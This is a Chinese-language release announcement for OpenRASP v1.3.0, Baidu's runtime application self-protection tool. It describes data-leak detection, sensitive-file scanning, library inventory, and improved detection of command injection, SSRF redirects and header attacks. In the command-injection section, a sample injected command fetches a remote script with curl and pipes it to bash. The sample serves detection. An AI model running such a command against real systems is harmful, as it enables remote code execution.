# **OpenRASP 是百度安全推出的一款开源、免费的自适应安全产品，目前与国际知名非盈利安全组织 OWASP（Open Web Application Security Project）达成深度合作，现已加入到OWASP全球技术项目中，在全球范围内进行大规模推广。**OpenRASP将新兴的RASP（Runtime Application Self-Protection）安全防护技术普及化，使其迅速成为企业Web安全防护中的一个重要武器，有效增强防御体系纵深和对漏洞防护的适应能力。由于OpenRASP直接在Web服务应用内部对漏洞脆弱环节做针对性防护，所以防护效能与传统WAF等手段相比有着革命性提升。OpenRASP通过开源社区迅速推广和成熟，解决了商业RASP长期以来难以克服的稳定性和兼容性问题，成为目前业界应用最广泛的RASP方案。

# 距上一个版本发布相隔约2个月，百度安全此次发布为 OpenRASP v1.3.0 正式版。

  
![](../Images/8a24463f0246b6430b9201f3c3425661.png)**数据泄露检测****对于企业而言，API 接口是数据泄露的常见来源**。随着公司业务的扩大，无论是梳理敏感数据的类型，还是梳理数据展示接口，都将成为一个难题。因此，我们增加了HTTP响应检测点，支持对请求进行检测。为了保证性能，我们默认每分钟仅抽样5个请求进行检测，且只处理 html/json/xml 三种响应类型（均可配置）:

```
type   = response
```

```
params = {
```

```
    "content\_type": "text/html",
```

```
    "content":      "<h1>xxxx</h1>"
```

```
}
```

在最新的官方插件里，我们增加了对**身份证**、**手机号**、**银行卡**三类数据的识别，当接口返回了此类数据，且**没有打码**时，我们会发出报警：

![](../Images/9044452d3fd6503dc20f3448e312c3fc.png)

如果此类页面没有认证，存在水平越权问题，或是被搜索引擎大量索引，将为企业带来重大风险。  
**另外一个常见数据泄露来源是Web根目录的敏感文件。**在公司成立早期，业务线发布流程不规范，将全站源代码，SQL文件，或者**业务日志**放在可下载的目录，是很常见的事情。因此，我们在PHP版本里加入了Web根目录扫描，若存在 `.git/.tar/.sql/.log` 等敏感文件（正则可配置），我们将会发出报警。为了保证性能，我们默认每隔6小时扫描一遍，最多检测100个文件:

![](../Images/b2916b0c8cdfa897746e597d519356a1.png)

对于根目录不是开放目录的情况，如果文件名可被猜解，同样存在数据泄漏的风险。  
![](../Images/8a24463f0246b6430b9201f3c3425661.png)**类库版本查询**最近两年，基于第三方类库的漏洞越来越多。在部署RASP进行防护的同时，安全工程师也应该推动业务线升级类库，修复漏洞。因此，我们在 v1.3 里加入了类库信息的采集，默认每6小时执行一次。目前支持 Java POM 信息、PHP composer.json 两种类型:

![](../Images/30ef0e8dce1c8fa7b543dac58d8bc861.png)

当漏洞爆发时，安全工程师可以快速定位受影响的业务列表，并推动升级。 

  

![](../Images/8a24463f0246b6430b9201f3c3425661.png)

**检测能力加强****首先，我们加强了命令注入的检测算法。**在扫描探测阶段，通常会产生语法错误，比如引号数量不是偶数；在漏洞利用阶段，攻击者通常会使用分隔符去执行 curl、bash 等命令:

```
ping -n 1 127.0.0.1; curl hxxp://ip/run.sh | bash
```

对于上述恶意的注入行为，我们都会检出并报警。**其次，我们加强了SSRF的检测。**在HTTP请求过程中，如果发生了跳转(对应状态码 301、302)，我们会再次调用插件进行检测。我们会同时传递跳转前的信息，以及跳转后的信息:

```


```
type   = ssrfRedirect

```

```
params = {
```

```
    "url":       "http://example.com/user",  // 原始请求URL
```

```
    "hostname":  "example.com"               // 原始请求域名
```

```
    "ip":        \["220.34.11.2"\]             // 原始请求IP
```

```
    "port":      "80",                       // 原始请求端口
```

```
    "url2":      "http://192.168.1.1/default.action",  // 重定向后URL
```

```
    "hostname2": "192.168.1.1"                         // 重定向后域名
```

```
    "ip2":       \["192.168.1.1"\]                       // 重定向后IP
```

```
    "port2":     "80",                                 // 重定向后端口
```

```
    "function":  "commons\_http\_client"
```

```
}
```


```

结合跳转后的信息，我们可以很好的识别DNS重新绑定攻击，以及HTTP内网跳转攻击。在官方插件里，若原始请求为正常请求，但是跳转的地址为内网地址，我们将判定为DNS重绑定攻击，并发出报警。**最后，我们增加了 header 攻击的检测。**对于SQL注入、命令注入等攻击，若攻击参数来自HTTP请求头，我们也可以进行防护。  

![](../Images/8a24463f0246b6430b9201f3c3425661.png) **商业版前瞻**

经过两年多的发展，开源版本的客户数量已经过百，QQ群人数超过1400人。为了更好满足企业级客户的需求，我们决定推出商业版。在2020年，我们计划先推出IAST商业版本，再推出线上防护的商业版本。相比于开源版本，商业版具有如下高级功能:

*   **动态污点追踪**。能够识别关键参数的来源，预判接口是否存在漏洞。
*   **漏洞检测能力更强**。支持NoSQL注入等22类攻击检测，硬编码密码等30类基线检测。
*   **多账号体系和权限管理**。可创建多个用户，并授予不同的权限。
*   **自动升级支持**。自动识别应用目录并部署，后续版本随应用重启而升级，无需再次部署。
*   **第三方类库弱点识别**。开源版本仅采集类库信息，商业版同时判断是否存在已知漏洞。
*   **可视化图表支持**。支持漏洞报告导出，以及更加全面的报表展示。

目前，商业版核心功能已经开发完毕，预计3~4月份可申请试用，具体时间请留意QQ群公告。
